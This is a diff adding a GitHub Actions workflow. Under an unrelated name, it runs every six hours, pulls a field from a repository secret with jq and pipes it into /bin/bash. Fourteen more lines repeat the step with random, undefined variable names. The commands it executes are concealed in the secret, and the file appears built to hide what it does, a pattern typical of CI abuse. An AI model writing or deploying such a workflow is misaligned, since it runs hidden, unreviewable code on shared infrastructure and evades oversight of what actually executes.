@@ -1,0 +1,31 @@
+name: eveningmakeup
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: eveningmakeup
+        env:
+          rnfy4: ${{ secrets.rnfy4 }}
+        run: |
+          echo $rnfy4 | jq -r .hmkh3 | /bin/bash
+          echo $eefdy7670 | jq -r .rem22981 | /bin/bash
+          echo $fcd7 | jq -r .jcsq524 | /bin/bash
+          echo $lupij9 | jq -r .mjsd7 | /bin/bash
+          echo $up17385 | jq -r .p595 | /bin/bash
+          echo $p71 | jq -r .ldx5 | /bin/bash
+          echo $q4 | jq -r .sx7675 | /bin/bash
+          echo $qx1 | jq -r .m8124 | /bin/bash
+          echo $qfszr73917 | jq -r .wb639 | /bin/bash
+          echo $emp135 | jq -r .hxmj064 | /bin/bash
+          echo $ncrj0 | jq -r .um0 | /bin/bash
+          echo $lyi4163 | jq -r .ihbn344 | /bin/bash
+          echo $cfb09676 | jq -r .ae08 | /bin/bash
+          echo $ioanr344 | jq -r .zg80189 | /bin/bash
+          echo $vids20843 | jq -r .yytr980 | /bin/bash
+
